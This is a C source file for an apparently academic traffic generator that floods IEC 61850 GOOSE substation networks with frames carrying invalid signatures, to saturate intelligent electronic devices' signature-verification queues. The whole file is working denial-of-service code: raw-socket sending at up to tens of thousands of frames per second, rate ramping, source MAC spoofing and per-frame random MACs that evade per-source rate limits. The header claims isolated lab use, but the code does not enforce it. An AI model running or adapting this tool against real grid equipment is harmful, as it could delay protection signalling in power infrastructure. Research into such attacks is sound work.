/* goose_attacker.c - CIL-DoS Research Traffic Generator
 *
 * Part of GridPulse: IEC 61850 CIL-DoS Attack Modeling Research
 * This tool generates GOOSE frames with invalid cryptographic signatures
 * to empirically validate the Cryptographically-Induced Latency DoS model.
 *
 * PURPOSE: Academic research tool for measuring the impact of
 * verification-queue saturation on IED response times.
 * This is NOT a weaponized exploit. It operates on an isolated
 * Docker bridge network with no external connectivity.
 *
 * Authors: Dr. Sapna V. M., Prasad B. H., Prajwal Chowdary M.
 * PES University, Department of Computer Science and Engineering
 *
 * Build: gcc -O2 -o goose_attacker goose_attacker.c -lssl -lcrypto -lpthread -lm
 */

#include "goose_common.h"

/* ---- Configuration ---- */
typedef struct {
    const char *interface;
    int         rate;           /* Target packets per second */
    int         duration;       /* Duration in seconds */
    int         ramp;           /* Ramp-up mode flag */
    int         ramp_start;     /* Starting rate for ramp */
    int         ramp_duration;  /* Ramp-up period in seconds */
    int         algo;           /* Signature algorithm to mimic */
    uint8_t     spoof_mac[6];  /* MAC to spoof (if set) */
    int         spoof_enabled; /* Whether to use spoofed MAC */
    int         random_mac;    /* Randomize source MAC per frame (multi-source flood) */
} attacker_config_t;

static attacker_config_t config = {
    .interface     = "eth0",
    .rate          = 25000,
    .duration      = 60,
    .ramp          = 0,
    .ramp_start    = 500,
    .ramp_duration = 30,
    .algo          = ALG_RSA_2048,
    .spoof_enabled = 0,
    .spoof_mac     = {0},
    .random_mac    = 0,
};

/* ---- Template Attack Signature ---- */
static uint8_t g_template_sig[8192];
static size_t  g_template_sig_len = 0;

static void init_attack_signature(int algo) {
    uint8_t dummy_msg[128] = "IEC61850_GOOSE_ATTACK_FRAME_TEMPLATE_PAYLOAD_TEST";
    g_template_sig_len = 0;

    if (algo == ALG_RSA_2048) {
        EVP_PKEY *key = generate_rsa_key();
        if (key) {
            EVP_MD_CTX *ctx = EVP_MD_CTX_new();
            EVP_DigestSignInit(ctx, NULL, EVP_sha256(), NULL, key);
            g_template_sig_len = sizeof(g_template_sig);
            EVP_DigestSign(ctx, g_template_sig, &g_template_sig_len, dummy_msg, sizeof(dummy_msg));
            EVP_MD_CTX_free(ctx);
            EVP_PKEY_free(key);
        }
    } else if (algo == ALG_ECDSA_P256) {
        EVP_PKEY *key = generate_ec_key();
        if (key) {
            EVP_MD_CTX *ctx = EVP_MD_CTX_new();
            EVP_DigestSignInit(ctx, NULL, EVP_sha256(), NULL, key);
            g_template_sig_len = sizeof(g_template_sig);
            EVP_DigestSign(ctx, g_template_sig, &g_template_sig_len, dummy_msg, sizeof(dummy_msg));
            EVP_MD_CTX_free(ctx);
            EVP_PKEY_free(key);
        }
    } else if (algo == ALG_HMAC_SHA256) {
        uint8_t hkey[32] = {0x42};
        unsigned int len = 0;
        hmac_sign(hkey, sizeof(hkey), dummy_msg, sizeof(dummy_msg), g_template_sig, &len);
        g_template_sig_len = len;
    }
#ifdef OQS_ENABLED
    else if (is_pqc_algo(algo)) {
        pqc_key_t *key = pqc_keygen(algo);
        if (key) {
            g_template_sig_len = sizeof(g_template_sig);
            pqc_sign(key, dummy_msg, sizeof(dummy_msg), g_template_sig, &g_template_sig_len);
            pqc_free(key);
        }
    }
#endif

    if (g_template_sig_len == 0) {
        g_template_sig_len = 256;
        RAND_bytes(g_template_sig, 256);
    }
    printf("[ATTACKER] Pre-generated valid template signature (%zu bytes) for %s\n",
           g_template_sig_len, algo_name(algo));
}

/* ---- Statistics ---- */
static uint64_t g_frames_sent = 0;
static uint64_t g_start_time_ns = 0;

/* ---- Build Attack Frame ---- */
static void build_attack_frame(goose_frame_t *frame, uint8_t *src_mac,
                                uint32_t sq_num) {
    memset(frame, 0, sizeof(goose_frame_t));

    /* Ethernet header */
    uint8_t dst[] = GOOSE_DST_MAC_BYTES;
    memcpy(frame->eth.dst_mac, dst, 6);
    memcpy(frame->eth.src_mac, src_mac, 6);
    frame->eth.ethertype = htons(GOOSE_ETHERTYPE);

    /* GOOSE PDU - structurally valid */
    frame->pdu.appid    = htons(GOOSE_APPID_DEFAULT);
    frame->pdu.length   = htons(sizeof(goose_pdu_t));
    strncpy((char *)frame->pdu.gocb_ref, "IEDA1/LLN0$GO$gcb01", 63);
    strncpy((char *)frame->pdu.dat_set,  "IEDA1/LLN0$Dataset1", 63);
    frame->pdu.st_num   = htonl(1);
    frame->pdu.sq_num   = htonl(sq_num);
    frame->pdu.test     = 0;
    frame->pdu.conf_rev = htonl(1);
    frame->pdu.trip_status = 0;

    /* Fill allData with pseudo-realistic sensor values */
    for (int i = 0; i < 32; i++)
        frame->pdu.all_data[i] = (uint8_t)(sq_num + i);

    /* Attach validly formatted signature structure.
     * Because the frame payload (sq_num / all_data) differs from the template
     * (and/or was signed with an unapproved key), the subscriber executes
     * full mathematical cryptographic verification before rejecting it.
     * This faithfully exercises the worst-case CIL-DoS attack mechanism. */
    frame->pdu.sig_algo = htons(config.algo);
    frame->pdu.sig_len  = htons((uint16_t)g_template_sig_len);
    memcpy(frame->pdu.signature, g_template_sig, g_template_sig_len);
}

/* ---- Precise Rate-Limited Sending ---- */
static void send_loop(int sockfd, int ifindex, uint8_t *src_mac) {
    goose_frame_t frame;
    uint32_t sq_num = 0;

    struct sockaddr_ll dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sll_family   = AF_PACKET;
    dest_addr.sll_protocol = htons(GOOSE_ETHERTYPE);
    dest_addr.sll_ifindex  = ifindex;
    dest_addr.sll_halen    = 6;
    uint8_t dst[] = GOOSE_DST_MAC_BYTES;
    memcpy(dest_addr.sll_addr, dst, 6);

    g_start_time_ns = get_time_ns();
    uint64_t last_stats_ns = g_start_time_ns;
    uint64_t last_sent_count = 0;

    printf("\n");
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  GridPulse CIL-DoS Research Traffic Generator           ║\n");
    printf("║  Algorithm: %-12s  Target Rate: %d pps        ║\n",
           algo_name(config.algo), config.rate);
    printf("║  Duration:  %d sec        Interface: %-10s       ║\n",
           config.duration, config.interface);
    if (config.ramp)
        printf("║  Ramp: %d → %d pps over %d sec                    ║\n",
               config.ramp_start, config.rate, config.ramp_duration);
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    while (g_running) {
        uint64_t now = get_time_ns();
        double elapsed_sec = (double)(now - g_start_time_ns) / 1e9;

        /* Check duration */
        if (elapsed_sec >= (double)config.duration)
            break;

        /* Calculate current target rate (ramp or fixed) */
        int current_rate = config.rate;
        if (config.ramp && elapsed_sec < config.ramp_duration) {
            double progress = elapsed_sec / (double)config.ramp_duration;
            current_rate = config.ramp_start +
                (int)(progress * (config.rate - config.ramp_start));
        }

        /* Calculate how many frames we SHOULD have sent by now */
        uint64_t expected_sent = (uint64_t)(elapsed_sec * current_rate);

        /* Send frames in a burst to catch up to expected count */
        while (g_frames_sent < expected_sent && g_running) {
            uint8_t frame_mac[6];
            uint8_t *use_mac = src_mac;
            if (config.random_mac) {
                /* Fresh locally-administered unicast MAC per frame: emulates a
                 * distributed / MAC-rotating flood that defeats single-source
                 * rate tracking and stresses priority isolation (Theorems 1-3). */
                RAND_bytes(frame_mac, 6);
                frame_mac[0] = (frame_mac[0] & 0xFE) | 0x02; /* unicast, locally administered */
                use_mac = frame_mac;
            }
            build_attack_frame(&frame, use_mac, sq_num++);

            size_t frame_len = sizeof(eth_header_t) + offsetof(goose_pdu_t, signature) + ntohs(frame.pdu.sig_len);
            frame.pdu.length = htons(frame_len - sizeof(eth_header_t));

            ssize_t sent = sendto(sockfd, &frame,
                                  frame_len,
                                  0, (struct sockaddr *)&dest_addr,
                                  sizeof(dest_addr));
            if (sent > 0)
                g_frames_sent++;
            else
                break;  /* Socket buffer full, back off */
        }

        /* Yield CPU briefly if we're ahead of schedule, otherwise busy-spin */
        if (g_frames_sent >= expected_sent) {
            /* Brief yield — use usleep(1) for minimal sleep (much better than nanosleep) */
            usleep(100);  /* 100 μs yield — allows ~10K checks/sec */
        }

        /* Print stats every 2 seconds */
        if (now - last_stats_ns >= 2000000000ULL) {
            uint64_t delta_frames = g_frames_sent - last_sent_count;
            double delta_sec = (double)(now - last_stats_ns) / 1e9;
            double actual_rate = (double)delta_frames / delta_sec;

            printf("[ATTACKER] %.1fs | sent: %lu | rate: %.0f pps (target: %d) | sqNum: %u\n",
                   elapsed_sec, g_frames_sent, actual_rate, current_rate, sq_num);

            last_stats_ns = now;
            last_sent_count = g_frames_sent;
        }
    }

    double total_elapsed = (double)(get_time_ns() - g_start_time_ns) / 1e9;
    printf("\n");
    printf("═══════════════════════════════════════════════════════════\n");
    printf("  FINAL STATS\n");
    printf("  Total frames sent:  %lu\n", g_frames_sent);
    printf("  Total time:         %.2f seconds\n", total_elapsed);
    printf("  Average rate:       %.0f pps\n",
           (double)g_frames_sent / total_elapsed);
    printf("═══════════════════════════════════════════════════════════\n");
}

/* ---- Usage ---- */
static void print_usage(const char *prog) {
    printf("GridPulse CIL-DoS Research Traffic Generator\n");
    printf("Generates IEC 61850 GOOSE frames with invalid signatures\n");
    printf("for CIL-DoS attack modeling research.\n\n");
    printf("Usage: %s [options]\n\n", prog);
    printf("Options:\n");
    printf("  -i, --interface IFACE   Network interface (default: eth0)\n");
    printf("  -r, --rate N            Packets per second (default: 25000)\n");
    printf("  -d, --duration N        Duration in seconds (default: 60)\n");
    printf("  -a, --algorithm ALGO    Algorithm: RSA-2048, ECDSA-P256, HMAC-SHA256\n");
    printf("      --ramp              Enable ramp-up mode\n");
    printf("      --ramp-start N      Starting rate for ramp (default: 500)\n");
    printf("      --ramp-duration N   Ramp-up period in seconds (default: 30)\n");
    printf("  -M, --spoof-mac MAC     Spoof source MAC (XX:XX:XX:XX:XX:XX)\n");
    printf("  -h, --help              Show this help\n");
}

int main(int argc, char *argv[]) {
    static struct option long_options[] = {
        {"interface",     required_argument, 0, 'i'},
        {"rate",          required_argument, 0, 'r'},
        {"duration",      required_argument, 0, 'd'},
        {"algorithm",     required_argument, 0, 'a'},
        {"ramp",          no_argument,       0, 'R'},
        {"ramp-start",    required_argument, 0, 's'},
        {"ramp-duration", required_argument, 0, 'D'},
        {"help",          no_argument,       0, 'h'},
        {"spoof-mac",     required_argument, 0, 'M'},
        {"random-mac",    no_argument,       0, 1001},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "i:r:d:a:M:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'i': config.interface = optarg; break;
            case 'r': config.rate = atoi(optarg); break;
            case 'd': config.duration = atoi(optarg); break;
            case 'a': config.algo = parse_algo(optarg); break;
            case 'R': config.ramp = 1; break;
            case 's': config.ramp_start = atoi(optarg); break;
            case 'D': config.ramp_duration = atoi(optarg); break;
            case 'h': print_usage(argv[0]); return 0;
            case 1001: config.random_mac = 1; break;
            case 'M': {
                /* Parse MAC address XX:XX:XX:XX:XX:XX */
                unsigned int m[6];
                if (sscanf(optarg, "%x:%x:%x:%x:%x:%x", &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6) {
                    for (int i = 0; i < 6; i++) config.spoof_mac[i] = (uint8_t)m[i];
                    config.spoof_enabled = 1;
                } else {
                    fprintf(stderr, "Invalid MAC format. Use XX:XX:XX:XX:XX:XX\n");
                    return 1;
                }
                break;
            }
            default:  print_usage(argv[0]); return 1;
        }
    }

    setup_signals();
    openssl_init();
    init_attack_signature(config.algo);

    printf("[ATTACKER] Initializing CIL-DoS research traffic generator...\n");
    printf("[ATTACKER] Interface: %s\n", config.interface);
    printf("[ATTACKER] Algorithm: %s\n", algo_name(config.algo));
    printf("[ATTACKER] Target rate: %d pps\n", config.rate);
    printf("[ATTACKER] Duration: %d seconds\n", config.duration);

    /* Create raw socket */
    int ifindex;
    int sockfd = create_raw_socket(config.interface, &ifindex);
    if (sockfd < 0) {
        fprintf(stderr, "[ATTACKER] Failed to create raw socket. Need root/CAP_NET_RAW.\n");
        return 1;
    }

    /* Get source MAC */
    uint8_t src_mac[6];
    if (get_if_mac(sockfd, config.interface, src_mac) < 0) {
        fprintf(stderr, "[ATTACKER] Failed to get interface MAC.\n");
        close(sockfd);
        return 1;
    }

    /* Override with spoofed MAC if configured */
    if (config.spoof_enabled) {
        memcpy(src_mac, config.spoof_mac, 6);
        printf("[ATTACKER] SPOOFING MAC: ");
        print_mac(src_mac);
        printf("\n");
    }

    printf("[ATTACKER] Source MAC: ");
    print_mac(src_mac);
    printf("\n");

    /* Run the send loop */
    send_loop(sockfd, ifindex, src_mac);

    close(sockfd);
    printf("[ATTACKER] Shutdown complete.\n");
    return 0;
}
